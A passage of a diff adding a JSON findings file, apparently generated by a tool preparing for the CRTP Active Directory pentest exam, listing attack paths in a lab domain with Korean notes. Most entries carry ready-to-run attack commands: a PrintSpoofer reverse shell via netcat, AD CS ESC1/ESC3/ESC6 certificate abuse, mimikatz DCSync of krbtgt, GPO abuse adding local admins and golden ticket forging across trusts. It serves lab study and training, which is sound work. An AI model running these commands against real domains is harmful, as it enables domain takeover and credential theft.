@@ -1,0 +1,1932 @@
+[
+  {
+    "fid": "HV-AccountOperators",
+    "technique": "High-value group: Account Operators",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "ACCOUNT OPERATORS@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Account Operators members: []"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'Account Operators' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'Account Operators' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "Account Operators 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "HV-Administrators",
+    "technique": "High-value group: Administrators",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "<unknown>",
+      "DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL",
+      "ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Administrators members: ['<unknown>', 'DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL', 'ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL']"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'Administrators' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'Administrators' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "Administrators 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "HV-BackupOperators",
+    "technique": "High-value group: Backup Operators",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "BACKUP OPERATORS@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Backup Operators members: []"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'Backup Operators' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'Backup Operators' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "Backup Operators 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "HV-DnsAdmins(typical)",
+    "technique": "High-value group: DnsAdmins (typical)",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "SRVADMIN@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DnsAdmins (typical) members: ['SRVADMIN@DOLLARCORP.MONEYCORP.LOCAL']"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'DnsAdmins' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'DnsAdmins (typical)' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "DnsAdmins (typical) 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "HV-DomainAdmins",
+    "technique": "High-value group: Domain Admins",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "SVCADMIN@DOLLARCORP.MONEYCORP.LOCAL",
+      "ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Domain Admins members: ['SVCADMIN@DOLLARCORP.MONEYCORP.LOCAL', 'ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL']"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'Domain Admins' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "Domain Admins 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "HV-DomainControllers",
+    "technique": "High-value group: Domain Controllers",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Domain Controllers members: []"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'Domain Controllers' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'Domain Controllers' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "Domain Controllers 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "HV-GroupPolicyCreatorOwners",
+    "technique": "High-value group: Group Policy Creator Owners",
+    "crtp_topic": "Enumeration / Objective",
+    "severity": "INFO",
+    "targets": [
+      "ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Group Policy Creator Owners members: ['ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL']"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainGroupMember -Identity 'Group Policy Creator Owners' -Recurse"
+      ],
+      "AD Module": [
+        "Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive"
+      ]
+    },
+    "verify": [
+      "최종 목표 계정 식별",
+      "현재 경로가 이 그룹으로 수렴하는지"
+    ],
+    "screenshots": [
+      "Group Policy Creator Owners 멤버십 확인 화면"
+    ],
+    "report_notes": "공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
+    "priority": 5
+  },
+  {
+    "fid": "LPRIV-SeImpersonatePrivilege",
+    "technique": "SeImpersonate -> SYSTEM (Potato)",
+    "crtp_topic": "Local Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "<current host>"
+    ],
+    "evidence": [
+      "token holds SeImpersonatePrivilege (Enabled)"
+    ],
+    "commands": {
+      "PrintSpoofer": [
+        "PrintSpoofer64.exe -i -c cmd",
+        "PrintSpoofer64.exe -c \"nc <studvm> 4444 -e cmd\""
+      ],
+      "GodPotato": [
+        "GodPotato-NET4.exe -cmd \"cmd /c whoami\""
+      ]
+    },
+    "verify": [
+      "escalation 후 whoami 가 'nt authority\\system' 인지",
+      "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지"
+    ],
+    "screenshots": [
+      "whoami /priv 에 SeImpersonatePrivilege 보이는 화면 (escalation 전)",
+      "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)"
+    ],
+    "report_notes": "Service-account token can impersonate SYSTEM via named-pipe/RPC trick. Most common service-account escalation. Use port 4444/8888 for any shell.",
+    "priority": 6
+  },
+  {
+    "fid": "ADCS-ESC1-ESC1-User",
+    "technique": "AD CS ESC1 — template 'ESC1-User'",
+    "crtp_topic": "Domain/Cross-Trust Privilege Escalation (AD CS)",
+    "severity": "CRITICAL",
+    "targets": [
+      "ESC1-User @ mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA"
+    ],
+    "evidence": [
+      "ESC1: template 'ESC1-User' on CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\\RDPUsers, mcorp\\Domain Users"
+    ],
+    "commands": {
+      "Certify request": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:ESC1-User /altname:administrator@moneycorp.local"
+      ],
+      "pfx 변환": [
+        "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out esc1.pfx"
+      ],
+      "Rubeus asktgt": [
+        "Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:<pfx_pw> /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt"
+      ]
+    },
+    "verify": [
+      "현재 계정이 dcorp\\RDPUsers, mcorp\\Domain Users 에 속하는지",
+      "인증서 request 성공 여부",
+      "발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근"
+    ],
+    "screenshots": [
+      "Certify find /vulnerable 에 'ESC1-User' ESC1 조건 보이는 화면",
+      "ESC1 request 성공 (인증서 발급) 화면",
+      "asktgt /ptt 후 klist + 대상 DC 접근 화면"
+    ],
+    "report_notes": "템플릿이 ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + 승인0 + 저권한 enroll → 임의 사용자(DA/EA) SAN으로 인증서 발급 후 그 사용자로 인증.",
+    "priority": 7
+  },
+  {
+    "fid": "ADCS-ESC3-SmartCardEnrollment-Agent",
+    "technique": "AD CS ESC3 — template 'SmartCardEnrollment-Agent'",
+    "crtp_topic": "Domain/Cross-Trust Privilege Escalation (AD CS)",
+    "severity": "CRITICAL",
+    "targets": [
+      "SmartCardEnrollment-Agent @ mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA"
+    ],
+    "evidence": [
+      "ESC3: template 'SmartCardEnrollment-Agent' on CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\\Domain Users"
+    ],
+    "commands": {
+      "1) EA 인증서 발급": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent"
+      ],
+      "2) on-behalf-of 요청": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:<client-auth 템플릿> /onbehalfof:moneycorp\\administrator /enrollcert:ea.pfx /enrollcertpw:<pw>"
+      ],
+      "3) asktgt": [
+        "Rubeus.exe asktgt /user:administrator /certificate:onbehalf.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt"
+      ]
+    },
+    "verify": [
+      "현재 계정이 dcorp\\Domain Users 에 속하는지",
+      "인증서 request 성공 여부",
+      "발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근"
+    ],
+    "screenshots": [
+      "Certify find /vulnerable 에 'SmartCardEnrollment-Agent' ESC3 조건 보이는 화면",
+      "ESC3 request 성공 (인증서 발급) 화면",
+      "asktgt /ptt 후 klist + 대상 DC 접근 화면"
+    ],
+    "report_notes": "Enrollment Agent 템플릿(Certificate Request Agent EKU)을 저권한이 enroll 가능 → EA 인증서로 특권 사용자 대신 client-auth 인증서 요청.",
+    "priority": 7
+  },
+  {
+    "fid": "DCSYNC-14-498",
+    "technique": "DCSync",
+    "crtp_topic": "Domain Persistence / Credential Access",
+    "severity": "CRITICAL",
+    "targets": [
+      "S-1-5-21-335606122-960912869-3279953914-498"
+    ],
+    "evidence": [
+      "S-1-5-21-335606122-960912869-3279953914-498 holds ['GetChanges'] on DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "mimikatz": [
+        "lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\\krbtgt",
+        "lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\\Administrator"
+      ],
+      "Rubeus/secretsdump": [
+        "# 대안: secretsdump.py -just-dc <dom>/<user>@<dc>"
+      ]
+    },
+    "verify": [
+      "현재 컨텍스트가 S-1-5-21-335606122-960912869-3279953914-498 인지/될 수 있는지",
+      "krbtgt 해시 확보 여부 (Golden Ticket 전제)"
+    ],
+    "screenshots": [
+      "S-1-5-21-335606122-960912869-3279953914-498 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)",
+      "dcsync 로 krbtgt 해시 덤프 화면"
+    ],
+    "report_notes": "DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성.",
+    "priority": 8
+  },
+  {
+    "fid": "DCSYNC-48-516",
+    "technique": "DCSync",
+    "crtp_topic": "Domain Persistence / Credential Access",
+    "severity": "CRITICAL",
+    "targets": [
+      "DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL holds ['GetChangesAll'] on DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "mimikatz": [
+        "lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\\krbtgt",
+        "lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\\Administrator"
+      ],
+      "Rubeus/secretsdump": [
+        "# 대안: secretsdump.py -just-dc <dom>/<user>@<dc>"
+      ]
+    },
+    "verify": [
+      "현재 컨텍스트가 DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL 인지/될 수 있는지",
+      "krbtgt 해시 확보 여부 (Golden Ticket 전제)"
+    ],
+    "screenshots": [
+      "DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)",
+      "dcsync 로 krbtgt 해시 덤프 화면"
+    ],
+    "report_notes": "DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성.",
+    "priority": 8
+  },
+  {
+    "fid": "ADCS-ESC6",
+    "technique": "AD CS ESC6 — CA allows requester-specified SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)",
+    "crtp_topic": "Domain/Cross-Trust Privilege Escalation (AD CS)",
+    "severity": "CRITICAL",
+    "targets": [
+      "mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA"
+    ],
+    "evidence": [
+      "CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA' has EDITF_ATTRIBUTESUBJECTALTNAME2 set — any enrollable client-auth template can specify an arbitrary SAN"
+    ],
+    "commands": {
+      "Certify (any client-auth template)": [
+        "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:<enrollable_clientauth_tpl> /altname:administrator@moneycorp.local"
+      ],
+      "asktgt": [
+        "Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:<pfx_pw> /domain:moneycorp.local /ptt"
+      ]
+    },
+    "verify": [
+      "CA 플래그에 EDITF_ATTRIBUTESUBJECTALTNAME2 확인",
+      "enroll 가능한 client-auth 템플릿 식별",
+      "발급 인증서로 특권 사용자 인증 성공"
+    ],
+    "screenshots": [
+      "Certify find 에서 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA' UserSpecifiedSAN 표시 화면",
+      "altname 지정 request 성공 화면",
+      "asktgt /ptt + klist 화면"
+    ],
+    "report_notes": "CA 'mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA' 레벨 SAN 악용(ESC6). 2022 패치 후에도 플래그가 켜져 있으면 유효.",
+    "priority": 9
+  },
+  {
+    "fid": "ACL-Owns-DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL-stem",
+    "technique": "ACL abuse: Owns",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "CRITICAL",
+    "targets": [
+      "DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Local System has Owns over DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL [HIGH-VALUE target]"
+    ],
+    "commands": {
+      "PowerView": [
+        "Add-DomainGroupMember -Identity 'DnsAdmins' -Members <you>"
+      ],
+      "AD Module": [
+        "Add-ADGroupMember -Identity 'DnsAdmins' -Members <you>"
+      ]
+    },
+    "verify": [
+      "Local System 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "Local System -(Owns)-> DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 10
+  },
+  {
+    "fid": "GPO-GenericAll-APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL-1123",
+    "technique": "GPO abuse: GenericAll over GPO",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericAll over GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainGPO -Identity 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL'",
+        "Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname"
+      ],
+      "Abuse (SharpGPOAbuse)": [
+        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL\"",
+        "SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\\you> --Command cmd.exe --Arguments \"/c net localgroup administrators <you> /add\" --GPOName \"APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL\""
+      ],
+      "PowerView": [
+        "New-GPOImmediateTask -TaskName x -GPODisplayName 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force"
+      ]
+    },
+    "verify": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지",
+      "GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지",
+      "영향 컴퓨터가 5대 타깃에 포함되는지"
+    ],
+    "screenshots": [
+      "GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)",
+      "GPO 수정 / task 추가 화면",
+      "영향 호스트에서 권한 획득 화면"
+    ],
+    "report_notes": "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericAll)-> GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).",
+    "priority": 11
+  },
+  {
+    "fid": "GPO-GenericWrite-APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL-1123",
+    "technique": "GPO abuse: GenericWrite over GPO",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainGPO -Identity 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL'",
+        "Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname"
+      ],
+      "Abuse (SharpGPOAbuse)": [
+        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL\"",
+        "SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\\you> --Command cmd.exe --Arguments \"/c net localgroup administrators <you> /add\" --GPOName \"APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL\""
+      ],
+      "PowerView": [
+        "New-GPOImmediateTask -TaskName x -GPODisplayName 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force"
+      ]
+    },
+    "verify": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지",
+      "GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지",
+      "영향 컴퓨터가 5대 타깃에 포함되는지"
+    ],
+    "screenshots": [
+      "GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)",
+      "GPO 수정 / task 추가 화면",
+      "영향 호스트에서 권한 획득 화면"
+    ],
+    "report_notes": "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).",
+    "priority": 11
+  },
+  {
+    "fid": "GPO-GenericWrite-DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL-7101",
+    "technique": "GPO abuse: GenericWrite over GPO",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'",
+        "Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname"
+      ],
+      "Abuse (SharpGPOAbuse)": [
+        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL\"",
+        "SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\\you> --Command cmd.exe --Arguments \"/c net localgroup administrators <you> /add\" --GPOName \"DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL\""
+      ],
+      "PowerView": [
+        "New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force"
+      ]
+    },
+    "verify": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지",
+      "GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지",
+      "영향 컴퓨터가 5대 타깃에 포함되는지"
+    ],
+    "screenshots": [
+      "GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)",
+      "GPO 수정 / task 추가 화면",
+      "영향 호스트에서 권한 획득 화면"
+    ],
+    "report_notes": "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).",
+    "priority": 11
+  },
+  {
+    "fid": "GPO-WriteDacl-DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL-7101",
+    "technique": "GPO abuse: WriteDacl over GPO",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'",
+        "Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname"
+      ],
+      "Abuse (SharpGPOAbuse)": [
+        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL\"",
+        "SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\\you> --Command cmd.exe --Arguments \"/c net localgroup administrators <you> /add\" --GPOName \"DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL\""
+      ],
+      "PowerView": [
+        "New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force"
+      ]
+    },
+    "verify": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지",
+      "GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지",
+      "영향 컴퓨터가 5대 타깃에 포함되는지"
+    ],
+    "screenshots": [
+      "GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)",
+      "GPO 수정 / task 추가 화면",
+      "영향 호스트에서 권한 획득 화면"
+    ],
+    "report_notes": "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).",
+    "priority": 11
+  },
+  {
+    "fid": "GPO-WriteOwner-DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL-7101",
+    "technique": "GPO abuse: WriteOwner over GPO",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'",
+        "Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname"
+      ],
+      "Abuse (SharpGPOAbuse)": [
+        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL\"",
+        "SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\\you> --Command cmd.exe --Arguments \"/c net localgroup administrators <you> /add\" --GPOName \"DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL\""
+      ],
+      "PowerView": [
+        "New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force"
+      ]
+    },
+    "verify": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지",
+      "GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지",
+      "영향 컴퓨터가 5대 타깃에 포함되는지"
+    ],
+    "screenshots": [
+      "GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)",
+      "GPO 수정 / task 추가 화면",
+      "영향 호스트에서 권한 획득 화면"
+    ],
+    "report_notes": "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).",
+    "priority": 11
+  },
+  {
+    "fid": "TRUST-EUROCORP.LOCAL",
+    "technique": "Domain/Forest trust abuse",
+    "crtp_topic": "Cross Trust Attacks",
+    "severity": "HIGH",
+    "targets": [
+      "EUROCORP.LOCAL"
+    ],
+    "evidence": [
+      "DOLLARCORP.MONEYCORP.LOCAL <-> EUROCORP.LOCAL dir=3 type=4 transitive=True SIDfilter=ON targetSID=S-1-5-21-3333069040-3914854601-3606488808"
+    ],
+    "commands": {
+      "Enum": [
+        "Get-DomainTrust",
+        "Get-DomainTrustMapping",
+        "Get-ADTrust -Filter *"
+      ],
+      "SID history (⚠ SID filtering ON — 차단 가능성)": [
+        "# 이 트러스트는 SID filtering 켜짐 → SID history 주입이 필터될 수 있음",
+        "# <child_krbtgt_hash> 는 DCSync 로 확보",
+        "mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-3333069040-3914854601-3606488808-519 /ptt"
+      ],
+      "대상 도메인 추가 열거": [
+        "Get-DomainTrust -Domain EUROCORP.LOCAL"
+      ]
+    },
+    "verify": [
+      "신뢰 방향/타입(부모-자식 vs 포레스트)",
+      "SID filtering = ON (OFF여야 SID history 통함)",
+      "child krbtgt 해시 확보 여부"
+    ],
+    "screenshots": [
+      "Get-DomainTrustMapping 출력",
+      "위조 티켓으로 대상 도메인 리소스 접근 화면"
+    ],
